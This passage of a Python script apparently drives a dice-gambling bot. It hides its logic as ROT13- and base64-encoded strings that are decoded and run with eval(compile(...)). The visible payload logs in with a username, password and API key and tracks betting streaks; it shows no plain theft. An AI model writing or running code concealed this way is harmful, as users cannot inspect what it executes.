Kycot0XVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVTSgo3IhqPN9VTyhqPuuoJ91oaDcVPbtMzkiLKDbo2WdJlWQo25znJpvKIg1paI0KIfvFJLtI2yhVy0cQDbtVPNtVPNtVTyzVT5iK3qcovN+VUEiqTSfK3qcowbAPvNtVPNtVPNtVPNtp3EuqUAspz9fMJWyqS93nJ4tCFOHpaIyQDbtVPNtVPNtVPNtVUA0LKEmK3WioTIvMKEsoT9mMFN9VRMuoUAyQDbtVPNtVPNtVPNtVUEiqTSfK3qcovNeCGRAPvNtVPNtVPNtnJLtoz9soT9mMFN+VUEiqTSfK2kip2H6QDbtVPNtVPNtVPNtVUA0LKEmK3WioTIvMKEsoT9mMFN9VSElqJHAPvNtVPNtVPNtVPNtp3EuqUAspz9fMJWyqS93nJ4tCFOTLJkmMD0XVPNtVPNtVPNtVPO0o3EuoS9fo3AyVPf9ZD0XVPNtVPNtVPOmrKZhp3Exo3I0YaqlnKEyXTucnzS1XlVtVPOKnJ4tH3ElMJSeVPVepzImX3A0pvu0o3EuoS93nJ4cX3WyMPfvVRkip2HtH3ElMJSeVPVepzImX3A0pvu0o3EuoS9fo3AyXFfvKUVvXD0XVPNtVPNtVPNAPt0XQDbtVPOyrTAypUD6QDbtVPNtVPNtpUWcoaDtXPWPMKEcozptp3EipPVcQDbtVPNtVPNtp3ymYzI4nKDbXD0XpvN9VTZhM2I0XUIloPkbMJSxMKWmCKIuYTEuqTR9rlWuVwbtVxkiM2yhVvjvF2I5VwbtVwIzZwIxZQp0BTWuMGEyA2SuZGIuZJR2LmD0AwMyMQx5VvjvIKAypz5uoJHvBvOiLzcoVxSwL291oaDvKIfvIKAypz5uoJHvKFjvHTSmp3qipzDvBvOiLzcoVxSwL291oaDvKIfvHTSmp3qipzDvKFjvIT90pPV6VPVvsFxAPzcmVQ0tnaAiov5fo2SxplulYaEyrUDcQDc0pax6QDbtVT1unJjbXD0XVPOjpzyhqPNbnTydLKHeVxWuoTShL2HtVvguLaHlXlV6VPVepzImX3A0pvuzoT9uqPudp1fvoUEwVy1oVxWuoTShL2HvKFxiXQRjVPbdVQtcXFxAPzI4L2IjqQbAPvNtpUWcoaDtXPWQnTIwnlOMo3IlVSImMKWhLJ1yVRShMPOMo3IlVSOup3A3o3WxVvxAPvNtp3ymYzI4nKDbXD0XQDbAPzEcL2HbnJ50XTMfo2S0XT9vnyfvITSlM2I0VSqcovWqXFbbZGNtXvbtBPxcYTyhqPuzoT9uqPuiLzcoVxkip2HtITSlM2I0Vy0cXvtkZPNdXvN4XFxc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
